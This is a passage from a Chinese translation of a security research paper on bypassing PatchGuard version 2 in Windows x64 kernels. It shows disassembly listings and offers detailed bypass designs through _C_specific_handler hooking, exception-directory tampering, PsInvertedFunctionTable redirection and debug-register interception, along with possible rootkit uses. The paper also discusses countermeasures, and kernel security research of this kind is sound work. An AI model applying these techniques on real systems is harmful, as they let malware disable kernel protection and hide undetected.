fffffadf`f6edd903 e8863a0000      call    fffffadf`f6ee138e
;
; The routine simply writes all zeros to dr7.
;
0: kd> u fffffadf`f6ee138e
fffffadf`f6ee138e 33c0            xor     eax,eax
fffffadf`f6ee1390 0f23f8          mov     dr7,rax
fffffadf`f6ee1393 c3              ret
```

## 3.6) Misleading Symbol Names / 误导性的符号名

微软在实现 PatchGuard 时必须考虑的一件事是：潜在的攻击者将能够访问操作系统的符号（symbols，调试信息，把地址与函数名、变量名等对应起来的数据）。作为一种调试辅助手段，微软把整个操作系统的符号公开提供。把操作系统符号从公众可访问的范围中移除并不可行（那样做会严重妨碍 ISV（Independent Software Vendors，独立软件供应商）在调试他们自己的驱动程序的过程）。因此，微软采取的路线是使用误导性的函数名，把 PatchGuard 的例程从随意的检视中遮掩起来。许多 PatchGuard 内部例程的名字乍看之下似乎听起来很正当，以至于若不具备内核的详细知识、或不实际检视这些例程，就很难仅仅查看内核中所有符号的列表，便定位出负责建立 PatchGuard 的那些例程。

以下列出的是在 PatchGuard 初始化期间使用的一些误导性符号：

  1. RtlpDeleteFunctionTable
  2. FsRtlMdlReadCompleteDevEx
  3. RtlLookupFunctionEntryEx
  4. SdbpCheckDll
  5. FsRtlUninitializeSmallMcb
  6. KiNoDebugRoutine
  7. SepAdtInitializePrivilegeAuditing
  8. KiFilterFiberContext

## 3.7) Integrity Checks Performed During System Initialization / 系统初始化期间执行的完整性检查

在系统初始化期间，PatchGuard 对它已部署的若干反调试机制执行完整性检查。如果这些机制在磁盘上被改动，PatchGuard 将检测出这些变化。例如，PatchGuard 会验证负责清除基于调试寄存器的断点的那个例程，是否包含与实际用来把 Dr7 清零的指令相对应的正确操作码（opcode，指令的机器码编码）字节：

```
;
; Here, we are in SepAdtInitializePrivilegeAuditing, or the
; initialization routine for PatchGuard during system startup.
;
; This code fragment is designed to validate that the
; KiNoDebugRoutine routine contains the expected opcodes that
; are used to zero out debug register breakpoints.  If the
; routine does not contain the correct opcodes, PatchGuard
; makes an early exit from SepAdtInitializePrivilegeAuditing.
;
INIT:0000000000832A6D lea     rax, KiNoDebugRoutine
INIT:0000000000832A74 cmp     dword ptr [rax], 230FC033h
INIT:0000000000832A7A jnz     abort_initialization
INIT:0000000000832A80 add     rax, 4
INIT:0000000000832A84 cmp     word ptr [rax], 0C3F8h
INIT:0000000000832A89 jnz     abort_initialization
```

## 3.8) Overwriting PatchGuard Initialization Code Post-Boot / 启动后覆写 PatchGuard 初始化代码

在 PatchGuard 完成自身的初始化之后，它会有意把负责建立 PatchGuard 的大部分代码清零。据推测，这样做是为了试图阻止第三方驱动程序分析内存中的内核代码，以检测或击败 PatchGuard。然而，这一手法显然可以被轻易绕过：只需打开磁盘上的内核映像即可。

启动之后，许多与 PatchGuard 相关的例程里全是零：

```
0: kd> u nt!KiNoDebugRoutine
nt!KiNoDebugRoutine:
fffff800`011a4b20 0000            add     byte ptr [rax],al

nt!FsRtlUninitializeSmallMcb:
fffff800`011a4aa2 0000            add     byte ptr [rax],al

0: kd> u nt!KiGetGdtIdt
nt!KiGetGdtIdt:
fffff800`011a4a20 0000            add     byte ptr [rax],al

0: kd> u nt!RtlpDeleteFunctionTable
nt!RtlpDeleteFunctionTable:
fffff800`011a1010 0000            add     byte ptr [rax],al
```

大部分 PatchGuard 初始化代码位于 ntoskrnl 的 INITKDBG 节（section，PE 映像中按用途划分的区段）之中。该节的若干部分会在初始化期间被清零。

## 4) Bypass Techniques / 绕过技术

尽管 PatchGuard 第 2 版采用了形形色色的反逆向工程与反调试技术，它对被第三方代码绕过这件事却远非无懈可击。与人们根据本文开头部分的描述可能预期的相反，PatchGuard 的盔甲上存在着许多可供第三方软件利用的破绽。下面概述几种绕过 PatchGuard 第 2 版的潜在技术，其中包括一种带有可实际工作的概念验证（proof of concept）代码的技术。在本文写作之时，这些技术适用于当前随 Windows XP x64 Edition（打齐全部热修复补丁）、Windows Server 2003 x64 Edition（打齐全部热修复补丁）以及 Windows Vista x64（打齐全部热修复补丁）一同发布的 PatchGuard 版本。作者只写出了第一种拟议绕过技术的完整实现，不过其余拟议的绕过方法预计在原理上也是可行的。

## 4.1) Interception of _C_specific_handler / 拦截 _C_specific_handler

在作者看来，禁用 PatchGuard 第 2 版最简单的做法，是在 _C_specific_handler 处拦截执行。_C_specific_handler 例程负责为那些用微软 C/C++ 编译器编译、并（使用 try/except、try/finally 或 try/catch 子句）的例程分发异常。这一组函数包括全部十个 PatchGuard DPC（Deferred Procedure Call，延迟过程调用，内核在 DISPATCH_LEVEL 上排队执行的回调机制）例程，以及内核中大多数其他的 C/C++ 函数。它还包括许多第三方驱动程序的例程；_C_specific_handler 是被导出的，编译器会为所有以某种形式利用 SEH（Structured Exception Handling，结构化异常处理，Windows 的异常处理机制）的 C/C++ 映像引用这个函数（从 ntoskrnl 导入）。正因如此，微软被迫永远从内核导出 _C_specific_handler，这使得从第三方驱动程序的视角来看，微软很难拒绝他人访问该例程的地址。此外，由于 _C_specific_handler 是从内核导出的，从一个第三方驱动程序的上下文中，跨所有内核版本检索它的地址都是轻而易举的事。这一做法所利用的事实是：PatchGuard 利用 SEH 来混淆对系统完整性检查例程的调用，结果反而把这个混淆机制变成了一种方便的手段，可以在系统完整性检查实际执行之前劫持执行控制流。

这一做法可以用几种不同的方式实现，但基本思想是：在 PatchGuard DPC 中引发故障的那条指令（无论在启动时被选中哪一个 DPC）与该 DPC 例程所关联的、会调用 PatchGuard 系统完整性检查例程的异常处理程序之间，找某处拦截执行。抱着这个想法来看，_C_specific_handler 正是人们所能期望的理想之选；当传给 PatchGuard DPC 例程的伪造 DeferredContext（延迟上下文，传给 DPC 例程的参数）值所触发的良性访问违规发生时，_C_specific_handler 就会被调用。此外，由于它是被导出的，就不存在与未来内核版本的兼容性方面的担忧，也不存在与内核的不同变体（PAE（Physical Address Extension，物理地址扩展）与非 PAE、MP（多处理器）与 UP（单处理器），等等）之间的兼容性担忧。

尽管挂钩（hooking，通过改写目标函数入口或指针使执行先转入己方代码的手法）_C_specific_handler 提供了一种方便的途径，可以在 PatchGuard 检查例程的执行路径上获得执行的控制权，但仍然存在一个问题：如何安全地解除（defuse）这个检查例程，并在一个安全的点恢复执行，使得 DPC 能继续被系统及时地处理。在 x86 上，这会构成一个严重的问题，因为在这种上下文里，我们（作为试图绕过 PatchGuard 的攻击者）会在一个异常处理程序处获得控制权，手上有一个上下文记录（context record，描述故障时刻处理器寄存器状态的数据结构），它描述的是 PatchGuard DPC 例程执行中途的上下文，却没有好的办法把这个上下文回退展开（unwind）到该 DPC 例程的调用者（即内核定时器 DPC 分发器）那里。

具有讽刺意味的是，正是由于 PatchGuard 只存在于 x64 而不存在于 x86，这个在 x86 上可能难以以通用方式解决的问题，在这里变得轻而易举。具体而言，Windows 的 x64 调用约定（calling convention，函数间关于参数传递、寄存器使用与栈布局的约定）的核心之中，烘焙进了广泛的展开（unwind）支持：存在着元数据，描述如何在其执行生命周期的任意一点上，展开任何一个操纵栈的函数。这些元数据被用来实现展开语义，使得函数能够被干净地展开，而不必去调用那些用代码实现的、依赖于与其关联的例程的执行上下文的异常/展开处理程序。这套广泛的展开元数据在这里可以被我们所利用，因为它提供了一种干净的机制，可以以完全兼容、且与内核版本无关的方式，越过 DPC 例程展开到 DPC 分发器那里。此外，鉴于这套展开元数据与 x64 调用约定的牵涉之深，微软也没有什么好办法禁用它。

利用一个函数的展开元数据来展开一个执行上下文的过程，被称为虚拟展开（virtual unwind），并且有一个有文档记载、且被导出的例程 [5] 来实现这一机制：RtlVirtualUnwind。使用 RtlVirtualUnwind，可以改动那个作为参数提供给 _C_specific_handler 的执行上下文（因而也就是提供给 _C_specific_handler 上的挂钩的那个执行上下文）。这个执行上下文描述的是 PatchGuard DPC 例程中发生访问违规那一时刻的机器状态。在对这个执行上下文执行一次虚拟展开之后，所剩下的事情就只是向内核模式异常分发器返回清单常量 ExceptionContinueExecution（意为"继续执行"），以便实现那个被改动过的上下文。这就完全绕过了 PatchGuard 系统完整性检查。作为一项额外的好处，对 _C_specific_handler 的挂钩只需要在 PatchGuard 第一次被调用之前存在即可。这是因为 PatchGuard 定时器是一个一次性（one-shot）定时器，而重新把该定时器排入队列的代码被虚拟展开跳了过去，于是 PatchGuard 在本次 Windows 启动会话的剩余时间里实际上被永久禁用了。

这项绕过技术最后剩下的一个障碍是：如何从内核模式代码可能产生的合法访问违规中，过滤出那些特定的 PatchGuard 访问违规异常。这很重要，因为内核模式下的访问违规是参数验证（即用于验证用户模式指针的探测与锁定（probe and lock）模型）中正常的一环，驱动程序和系统服务都会用到它。幸运的是，做出这个判定很容易，因为一般而言，只有针对一个用户模式地址的访问违规，才是合法地可以用 try/except 来捕获的（如前所述）。PatchGuard 是这条规则的一个罕见例外：它拥有一块定义明确的无人区（no-mans-land）区域，在那里可以尝试访问而不必担心会发生错误检查（bugcheck，Windows 内核的致命错误停机，即蓝屏）。因此，可以安全地作出这样一个假设：任何与内核模式地址有关的访问违规，要么是 PatchGuard 在触发它自身的执行，要么是一个行为极其恶劣、严重违反 Windows 内核模式驱动程序相关规则的第三方驱动程序所为。作者认为，后一种情形不值得被当作一个阻碍因素来考虑，尤其是因为倘若这样一个彻底损坏的驱动程序真的存在，它早就已经在用错误检查随机地把系统搞崩了。作为一条补充说明，值得一提的是：由于处理器报告对非规范地址（non-canonical address，x64 地址空间中不合规范形式、必然引发故障的地址）的违规的方式，传递给异常处理程序的异常信息块中所引用的地址将永远是 0xFFFFFFFF`FFFFFFFF。不过，这并不影响这项技术作为一种以版本无关的方式绕过 PatchGuard 的有效方法的成立。

值得一提的是，这项技术涉及修改内核这一事实并不是问题（除了在安全地修补一个正在运行的二进制文件时所固有的那些竞态条件之外）。这个挂钩会在 PatchGuard 有机会从系统完整性检查例程的上下文中注意到这个挂钩之前，就把 PatchGuard 禁用掉。

与 Uninformed 关于 PatchGuard 的原始论文 [2] 之前所提出的方案相比，这一拟议方案具有若干优势。具体而言，它不涉及逐个定位每一个 DPC 例程（甚至根本不依赖任何形式的代码指纹识别（code fingerprinting，凭代码字节特征来识别目标例程的方法）；只使用被导出的符号）。这既提高了该拟议方案的可靠性（因为代码指纹识别在误报方面总是会引入额外的误差余地），也提高了它对微软反击的韧性。由于这项技术仅仅依赖于被导出的函数，并且不带有任何关于 PatchGuard 可用的 DPC 数量的依赖（也不带有任何在运行时定位它们的依赖），封堵这一方案将会比仅仅再增加一个可能的 DPC 例程、或者改变某个现有 DPC 例程的属性——以应付那些采用基于签名的方法来定位待修补 DPC 例程的第三方驱动程序——要牵涉多得多。

尽管这项技术对那些并不直接涉及 PatchGuard 自身赖以运作的底层机制的内核变更相当有韧性（它能够在 Windows Server 2003 x64 和 Windows Vista x64 上不作修改地运行这一事实，就证明了这一点），但微软仍然有许多不同的办法，可以在未来对 PatchGuard 的一次更新中封堵这一攻击。最显而易见的解决方案是：彻底放弃把 SEH 作为安排 PatchGuard 系统完整性检查时所涉及的一项核心机制。放弃 SEH，就移除了这里所呈现的那个方便机制（挂钩 _C_specific_handler）——一种以版本无关的方式切入 PatchGuard 系统完整性检查所涉及的执行路径的方法。如果微软走这条路线，潜在的攻击者将需要设计出另一种机制，在系统完整性检查运行之前获得执行的控制权。假定微软打出的牌是正确的，一个未来的 PatchGuard 修订版将不会再有这样一个易于访问的机制，可以用通用的方式切入执行过程，这在很大程度上就抵消了这里所提出的方案。微软也可以在 DPC 触发异常之前，对异常处理程序路径做某种预先验证；不过，鉴于这并不是应对这样一种技术最简单、最优雅的办法，作者认为这是一个不太可能被采用的解决方案。

## 4.2) Interception of DPC Exception Registration / 拦截 DPC 异常注册

目前，所有通向 PatchGuard DPC（Deferred Procedure Call，延迟过程调用，即内核中把工作推迟到较低中断级再执行的机制）例程执行的执行路径，都涉及一个异常／展开处理程序。这又是一个单点故障式的弱点，可以被试图禁用 PatchGuard 的第三方利用。有人提出了另一种击败 PatchGuard 的办法：先检测出全部 PatchGuard DPC 例程，再拦截每一个 DPC 的异常处理程序注册。

虽然这项技术不如 4.1 节提出的技术那样干净利落、界限分明，但作者认为，它是绕过 PatchGuard 第 2 版的一个可行机制。这项技术的核心做法，是修补 PatchGuard 可能用到的每一个 DPC 例程的异常注册，使每一条异常注册都指向一个采用虚拟展开（virtual unwind，即不真实执行函数尾声、而是根据展开元数据模拟栈帧退出过程）的例程，从而在不调用系统完整性检查的情况下，安全地退出 PatchGuard DPC。不过，任何这类办法都会面临若干障碍。

这项技术的第一个主要困难，是定位每一个 PatchGuard DPC。由于没有任何一个 PatchGuard DPC 例程是导出的，因此要找到需要修补的位置，就需要多动一些创造性的脑筋。作者认为，模式匹配（pattern matching）与代码指纹（code fingerprinting）相结合，最适合实现这一目标；在 PatchGuard 第 2 版中，不同的 PatchGuard DPC 例程之间存在许多共同点，可以用来以相对较高的置信度定位它们。具体来说，作者认为以下标准可以用来检测 PatchGuard DPC 例程：

  1. 每一个 DPC 例程都有一条以异常／展开方式标记的、针对 _C_specific_handler 的注册。  
  2. 每一个 DPC 例程都恰好有四个 _C_specific_handler 作用域。
  3. 每一个 DPC 例程在构成 ntoskrnl 的可执行代码节中，都至少两次以原始地址形式（64 位指针）被引用。
  4. 每一个 DPC 例程都至少有两个 _C_specific_handler 作用域带有关联的展开／异常处理程序。
  5. 每一个 DPC 例程都恰好有一个 Cspecifichanlder 作用域，其中调用了一个引用 RtlUnwindEx（一个导出的例程）的公共子函数。
  6. 每一个 DPC 例程都有若干组独特的、通常很少见的指令（ror/rol 指令）。

只要给出其中若干条（甚至全部）标准，就应当能够通过扫描内核中不可分页的代码，准确地定位全部十个 DPC 例程。可以通过处理内核的异常目录，来定位 DPC 例程的异常注册信息（事实上，上述大多数标准都要求把这一步作为先决条件来完成）。定位内核映像基址也相当 trivial（微不足道）；可以取一个导出例程的地址，然后将其截断到一个 64K 区域。从那里开始，只需以 64K 为步长向下搜索 DOS 头签名（随后检查是否存在 PE32+ 头）即可。

这种办法还必须解决另一个障碍，那就是替换用的异常处理程序例程的放置位置。这些例程必须位于距内核映像基址 4GB 以内的范围内（展开元数据中只有一个 32 位的 RVA，即 Relative Virtual Address，相对虚拟地址），这意味着一般来说，简单地把它们存放在驱动程序二进制文件或池分配（pool allocation）中并不现实（默认情况下，这些地址通常距内核映像基址远远超过 4GB）。据作者所知，没有任何已公开文档且已导出的例程，能够在指定的虚拟地址处分配内核模式虚拟内存。不过，理论上可以采取其他不太体面的办法（例如分配物理内存，并直接修改分页结构，从而在距内核映像基址 4GB 以内的范围内创建一个有效的内存区域）。

一旦解决了这些困难，这种办法剩下的部分就相当 trivial 了（并且与 4.1 节所述技术的某些部分相似）。具体来说，被替换的异常处理程序需要调用 RtlVirtualUnwind，展开回到内核 DPC 分发器，然后请求在展开后的上下文处恢复执行。

在作者看来，这一机制远不如第一个机制那样健壮，不过，只要彻底放弃把 SEH（Structured Exception Handling，结构化异常处理，即 Windows 基于注册表／展开元数据的异常分发机制）作为 PatchGuard 系统完整性检查例程执行的关键路径，这两种办法都可能被禁用。具体而言，微软可以改变 DPC 例程的特征，试图阻碍在运行时对它们进行指纹识别和检测。对展开元数据进行预先验证（或者在异常分发器本身中增加额外检查，以确保作为某个映像的一部分而注册的所有 SEH 例程都位于该映像在内存中的范围之内），也可以用来击败这项技术。验证作为某个映像的一部分而注册的 x64 上的 SEH 例程确实存在于某个映像内部，还有其他安全上的好处，下文将会讨论。因此，作者预计这一点会出现在未来的 Windows 版本中。

## 4.3) Interception of PsInvertedFunctionTable / 拦截 PsInvertedFunctionTable

在系统完整性检查例程所依赖的 SEH 代码路径内拦截 PatchGuard 这一主题，还有另一种变体，它利用了 x64 异常分发器中存在的一项优化。具体来说，可以利用这样一个事实：x64 上的异常分发器使用一个缓存来提高异常处理的性能。利用这个缓存，就有可能在 PatchGuard DPC 例程故意制造一次访问违规异常、以触发系统完整性检查时，拦截执行的控制权。这项拟议的技术使用的是内核中的 nt!PsInvertedFunctionTable 全局变量，它代表一个缓存，用来把 RIP（指令指针寄存器）值快速翻译为关联的映像基址和异常目录指针，而不必（缓慢地）搜索已加载内核模块的链表。

这项技术与 4.2 节所述的技术相当相似。不同之处在于，它不是修改内核映像在内存中与每一个 PatchGuard DPC 例程相对应的实际异常目录条目，而是修改存储在 PsInvertedFunctionTable 内部的、被缓存的异常目录指针。RtlLookupFunctionTableEntry 会查询 PsInvertedFunctionTable，以便把一个 RIP 值翻译为关联的映像（以及展开元数据块）。RtlLookupFunctionTable 内部的逻辑，本质上是搜索驻留在 PsInvertedFunctionTable 中的缓存条目，寻找与给定 RIP 值相对应的映像。如果找到命中项，那么异常目录指针就直接从 PsInvertedFunctionTable 缓存中加载，而不是通过解析给定映像的 PE 头这一（较慢的）过程来获得。如果没有找到命中项，那么就搜索已加载模块链表。假设在已加载模块列表中找到了命中项，那么就会处理关联模块的 PE 头，以便定位该模块的异常目录。从那里开始，再搜索异常目录，以定位与包含指定 RIP 值的函数相对应的展开元数据块。

支撑 PsInvertedFunctionTable 的结构（RTL_INVERTED_FUNCTION_TABLE）可以用 C 语言描述如下：

```c
typedef struct _RTL_INVERTED_FUNCTION_TABLE_ENTRY
{
    PIMAGE_RUNTIME_FUNCTION_ENTRY ExceptionDirectory;
    PVOID                         ImageBase;
    ULONG                         ImageSize;
    ULONG                         ExceptionDirectorySize;
} RTL_INVERTED_FUNCTION_TABLE_ENTRY, * PRTL_INVERTED_FUNCTION_TABLE_ENTRY;

typedef struct _RTL_INVERTED_FUNCTION_TABLE
{
    ULONG Count;
    ULONG MaxCount; // always 160 in Windows Server 2003
    ULONG Pad[ 0x2 ];
    RTL_INVERTED_FUNCTION_TABLE_ENTRY Entries[ ANYSIZE_ARRAY ];
} RTL_INVERTED_FUNCTION_TABLE, * PRTL_INVERTED_FUNCTION_TABLE;
```

在 Windows Server 2003 中，PsInvertedFunctionTable 内包含的数组里，为多达 160 个已加载模块预留了空间。在 Windows Vista 中，这个数字已经扩展到 512 个模块条目。系统模块加载器维护着这个已加载模块数组，使得当一个模块被加载或卸载时，PsInvertedFunctionTable 内会相应地创建或删除一个对应条目。PsInvertedFunctionTable 内的模块数组被耗尽，并不是致命错误；在这种情况下，与额外模块有关的异常分发性能会变慢，但系统仍然能够正常工作。

由于 PsInvertedFunctionTable 所描述的 RIP 到异常目录的缓存，保存的是指向关联模块异常目录的完整的 64 位指针，因此有可能把被缓存的异常目录指针与其对应的映像解除关联。换句话说，可以修改某个特定的、被缓存的 RTL_INVERTED_FUNCTION_TABLE_ENTRY 的 ExceptionDirectory 成员，使其指向一个任意位置，而不是该模块的异常目录。没有任何安全或完整性检查会验证 ExceptionDirectory 成员是否指向给定映像内部。这可以被第三方驱动程序利用，从而接管前 160 个（在 Windows Vista 的情况下是 512 个）内核模块中任意一个的异常分发。这个已加载模块列表包括一些关键映像，例如 HAL（Hardware Abstraction Layer，硬件抽象层，通常是缓存中的第一个条目）和内核本身（通常是缓存中的第二个条目）。就绕过 PatchGuard 而言，这使得第三方驱动程序可以把内核的异常目录数据复制到动态分配的内存中，并对其进行调整，使得 PatchGuard DPC 例程的异常处理程序指向一个存根函数，该函数按照 4.2 节所述的技术调用一次虚拟展开。在建立好其修改过的内核异常目录影子副本之后，第三方驱动程序所需要做的，就只是把 PsInvertedFunctionTable 中内核对应的缓存条目的 ExceptionDirectory 指针，替换为指向该影子副本的指针。在那之后，这种办法本质上就与 4.2 节所述的拟议办法相同了。它还有一个额外的优点：从验证异常分发路径完整性的角度来看，它更难被检测到，因为与内核映像在内存中关联的异常目录实际上并没有被修改；被改变的只是一个缓存中指向异常目录的指针。

不过，这种办法确实需要一种可靠的机制，能够在运行时检测到 PsInvertedFunctionTable（它并未被导出）。作者认为，这并不是一项特别困难的任务，因为 PsInvertedFunctionTable 的前几个成员（具体来说，最大条目计数，以及 HAL 和内核的条目）将具有可预测的值，可以用来以经典的 egghunt（逐字节特征搜索）风格搜索内核全局变量空间。为了提高准确性，还可以应用额外的启发式规则，例如要求内核代码中有若干处数据引用指向疑似的 PsInvertedFunctionTable 位置。

这项拟议的办法，可能会被针对技术 4.1 和 4.2 所提出的许多反制措施所反制。此外，这项技术还可以通过验证 PsInvertedFunctionTable 内部的异常目录指针来反制，例如确保此类异常目录指针位于其声称关联的映像的范围之内。尽管这种验证并不完美，因为仍然有可能把异常目录指针重新定位到映像内部另一个可以在运行时安全修改的位置，例如与一个大型全局变量数组重叠的位置之类，但它无疑会增加颠覆异常分发器的 RIP 翻译缓存的难度。还可以采用类似的额外验证技术，例如要求异常目录指向只读内存，以同样减少第三方驱动程序能够有意义地颠覆该缓存（且结果不只是导致系统崩溃）的机会。

应当指出的是，在当前的实现中，PsInvertedFunctionTable 为潜在的恶意软件提供了一个相对诱人的目标，使其可以在不被检测到的情况下劫持内核的某些部分。事实上，通过精心策划地颠覆 PsInvertedFunctionTable，第三方软件可以接管整个内核中的异常分发器，从而获得执行的控制权。虽然这项技术比直接修补内核要受限得多，但它的优点是完全不会被当前的 PatchGuard 版本检测到（出于显而易见的原因，PatchGuard 无法验证那些可能在运行时毫无预告地发生变化的全局变量）。它还有一个优点：不会被当前的 rootkit（rootkit，指隐藏自身并维持特权访问的恶意软件）检测系统检测到，据作者所知，这些系统目前对 PsInvertedFunctionTable 还一无所知、浑然不觉。尽管攻击者首先需要管理员权限（或者一个授予此类权限的漏洞利用）才能修改 PsInvertedFunctionTable，但微软近来已经投入了大量精力，甚至要保护内核免受拥有管理员权限的用户的侵害。例如，可以设想这样一个 rootkit 风格的程序：它拦截系统服务的异常分发器，并向系统服务传入无效的用户模式指针，以便在标准指针探测因给定用户模式指针参数无效而抛出异常时，在不被检测到的情况下秘密地执行内核模式代码。鉴于这种威胁（从 rootkit 的角度来看），作者认为，如果微软希望继续沿着强化内核、抵御拥有管理员特权的恶意代码这条道路走下去，那么对 PsInvertedFunctionTable 中被缓存的异常目录指针增加额外验证，将符合微软的最大利益。

## 4.4) Interception of KiDebugTrapOrFault / 拦截 KiDebugTrapOrFault

尽管迄今为止提出的许多阻挡 PatchGuard 的技术，都依赖于 PatchGuard 利用 SEH 来启动系统完整性检查执行这一事实，但也可以采取不依赖这一特定 PatchGuard 实现细节的不同办法。其中一种绕过 PatchGuard 的替代技术，涉及颠覆内核调试故障处理程序：KiDebugTrapOrFault（内核调试陷阱或故障处理程序）。这个处理程序代表所有调试异常（例如所谓的硬件断点）的入口点，因此是绕过 PatchGuard 的一个有吸引力的目标。

这项拟议技术的基础，是利用一组硬件断点，在 PatchGuard 通向系统完整性检查的执行路径内部一个方便的关键位置拦截执行。这项技术比许多先前描述的技术具有更大的灵活性，不过这种灵活性是以实现明显更加复杂（且困难）为代价的。具体来说，可以使用这项拟议技术，在对 PatchGuard 系统完整性检查执行至关重要的任何一点拦截控制权（例如，内核 DPC 分发器、某个 PatchGuard DPC 例程，或者异常分发代码路径中一个方便的位置，例如 _C_specific_handler）。

实现这种执行拦截的方式，是接管调试异常处理。这可以通过几种不同的方式来完成；例如，可以挂钩 KiDebugTrapOrFault，或者修改 IDT（Interrupt Descriptor Table，中断描述符表）目录，直接把调试异常重新指向由驱动程序提供的代码，从而完全绕过 KiDebugTrapOrFault。甚至还有一些办法，可以让这种拦截以对当前 PatchGuard 实现透明的方式完成，例如按照技术 4.3 所述拦截 PsInvertedFunctionTable。然后，驱动程序可以修改 KiDebugTrapOrFault 的展开元数据，并为这个例程创建一个异常处理程序。这一步将允许对所有调试故障进行透明的、第一机会（first-chance，即异常首次被分发、尚未判定无人处理时）的访问（因为 KiDebugTrapOrFault 在内部构造并分发一个描述该调试故障的 STATUS_SINGLE_STEP 异常；通常情况下，这会把 STATUS_SINGLE_STEP 异常呈现给调试器，但从技术上讲，没有任何理由说一个标准的 SEH 风格异常处理程序不能捕获这个异常）。无论通过何种方式获得对调试陷阱处理程序执行流的控制权，这项拟议办法的下一步，都是修改所请求关注点处的执行（无论那是内核定时器 DPC 分发器——可以通过排队一个 DPC 并执行一次虚拟展开而很容易地找到它，还是一个 PatchGuard DPC 例程，还是 _C_specific_handler，或者 PatchGuard 关键执行路径中任何其他关注点），以阻止 PatchGuard 的系统完整性检查执行。

在实现者通过所期望的任何手段建立起对调试陷阱处理程序的控制之后，剩下的就只是在目标位置上设置基于调试寄存器的断点。当这些断点被命中时，控制权被转移到调试陷阱处理程序，并从那里转移到实现者的驱动程序代码，该代码可以按需行事，例如在恢复执行之前，修改异常发生时处理器的执行上下文。

与直接修补内核代码（即操作码替换）相比，这种办法的优点有三方面。第一，它更加灵活，因为在任意位置放置一个绝对的 64 位跳转没有任何困难（在 x64 上，从内存中任何任意位置进行这样的跳转，通常需要大约 12 个操作码字节）。例如，不必担心被跳转覆盖的操作码空间，是否可能与一个作为跳转目标的完整指令边界重叠，从而可能导致无效代码被执行。第二，这种办法可以免去在内核模式下实现一个反汇编器（或其他类似形式的代码分析）的需要，因为硬件断点允许在一个精确位置获得执行的控制权，而不必担心为跳转补丁腾出足够的空间，然后再把原始指令放回一个跳转存根中，以便（如果需要的话）让执行在原始的有效指令流处恢复。最后，如果做得正确，这项技术可以用一种真正没有竞态条件的方式实现（因为唯一需要做的修补，是对 PsInvertedFunctionTable 中一个指针对齐的值进行一次互锁的 8 字节交换——如果采取那种办法的话）。

这种办法确实要求实现者在内核中挑选一个（或多个）位置，在其上设置断点以获得执行的控制权。有许多可能性，例如 DPC 分发器（在那里，可以通过检测例如 DeferredContext 中的无效内核指针，来过滤掉 PatchGuard DPC）、执行分发器路径（在那里，可以展开越过 PatchGuard DPC 的访问违规异常）、PatchGuard DPC 本身（在那里，如果该 DPC 正由 PatchGuard 调用，又可以利用 RtlVirtualUnwind 展开越过它，从而绕过 PatchGuard），或者任何其他可供选择的位置。这种办法的优点之一是，在内核中任何能够跨内核版本可靠定位的位置拦截执行都相对容易，这使得它在被轻松调整以击败未来的 PatchGuard 实现方面，可能比先前讨论的一些绕过技术要灵活得多。

通常情况下，内核中有逻辑阻止用户模式代码通过 NtSetContextThread 把杂散的内核地址放入调试寄存器。可能有必要进行额外的修改，以确保调试寄存器中的自定义值能够跨上下文切换而持续存在，其方式与内核调试器用来使调试寄存器持续存在的机制相同。

在作者看来，原则上微软很难击败这项技术，除非有硬件支持（例如虚拟化）。尽管微软可以把 PatchGuard 的关键代码路径搬来搬去，但这项技术提供了一种通用机制，借此内核中的任何位置都可以被秘密拦截，因此它相对容易被调整以适应未来的 PatchGuard 修订版本。可以采取的一种办法，是加强对调试陷阱处理程序的验证，试图使它更难在不被 PatchGuard 或其他某种验证机制检测到的情况下被拦截。针对这类战术（总体而言）的其他反制措施，是从第三方驱动程序的角度出发，使所有关键代码路径难以在所有内核版本之间以一致且可靠的方式可靠定位。这很可能被证明是困难的，因为内核内部工作的许多内容，都以某种方式暴露给驱动程序（即导出的函数），或者以其他方式间接暴露给驱动程序（即通过 IDT 暴露的陷阱标签、通过展开元数据暴露的异常处理程序，以及在把异常分发给 SEH 注册的过程中所使用的导出函数）。因此，把 PatchGuard 与所有这类外部可见的位置（这些位置相对容易被第三方驱动程序攻陷）完全隔离开来，很可能是一项艰巨的任务。

调试陷阱处理程序的用途，不止是简单地躲避 PatchGuard，以便允许通过操作码替换进行传统的内核代码修补。它还可以被用来完全消除为了获得执行控制权而进行基于操作码替换的内核修补的需要。在这个意义上，通过以一种对 PatchGuard 透明的方式接管调试陷阱处理程序（例如通过拟议的基于 PsInvertedFunctionTable 的办法），就有可能在每一个关注地址处设置基于调试寄存器的断点（假设有足够多的调试寄存器来修补所有关注位置）。从调试陷阱处理程序出发，可以完全改变调试异常发生点处的执行上下文，这与通过传统的基于操作码替换的修补在给定位置所能做到的事情完全相同。这种透明修补对微软来说将极难检测，因为调试寄存器必须保持可供内核调试器使用。在不完全废掉内核调试器在 PatchGuard 初始化之前未附加的情况下设置断点的能力的前提下，作者看不到一种特别可行（即没有 trivial 绕过办法）的方法，能让微软阻止（第三方驱动程序）使用调试寄存器来改变内核中选定点处的执行上下文。因为这种办法利用了这样一个事实：微软从商业案例的角度出发，必须让 IHV（Independent Hardware Vendor，独立硬件供应商）和 ISV（Independent Software Vendor，独立软件供应商）能够在 Windows 上调试他们的代码，所以作者相信，它不太可能被微软成功禁用。此外，因为这类技术甚至可以在不需要禁用 PatchGuard 这一基本要求的情况下实现，它们本身就更有可能适用于未来的 PatchGuard 修订版本。毕竟，如果 PatchGuard 甚至检测不到对内核的改变（因为内核代码根本没有被修补），那么就没有理由费心去试图禁用它，这样也就使人摆脱了每出一个新 PatchGuard 修订版就要与微软玩追赶游戏这一相对麻烦的事情。

### 4.5) General Detect Bit Interception（通用检测位拦截）

PatchGuard 的反调试机制之一与调试寄存器有关。具体来说，PatchGuard 会尝试清零 Dr7（调试控制寄存器），以此禁用所有基于调试寄存器的断点，这是它进入系统完整性检查例程后最先执行的任务之一。这在 PatchGuard 内部构成了一个固有弱点，因为处理器本身内置了支持，允许人们检测（并拦截）对任何调试寄存器的直接访问。这种支持主要是历史遗留的，原本是为所谓的在线仿真器（in-circuit emulators，ICEs）设计的——这类特殊的硬件组件充当真正的基于硬件的调试器，允许人们完全在系统上下文之外控制一颗处理器，本质上是把调试器与操作系统以及其下运行的任何程序真正隔离开来。这种支持体现在 Dr7 的 General Detect bit（通用检测位，即 Dr7 中一个标志位，置位后，任何对调试寄存器的成功访问都会触发调试陷阱）上：当该位置位时，任何对调试寄存器的成功访问都会导致生成一个调试陷阱。这一点意义重大，因为它为攻击者提供了一种方法，可以捕获 PatchGuard 对 Dr7 的访问（将其清零），实际上也就提供了一种手段，能够精确定位 PatchGuard 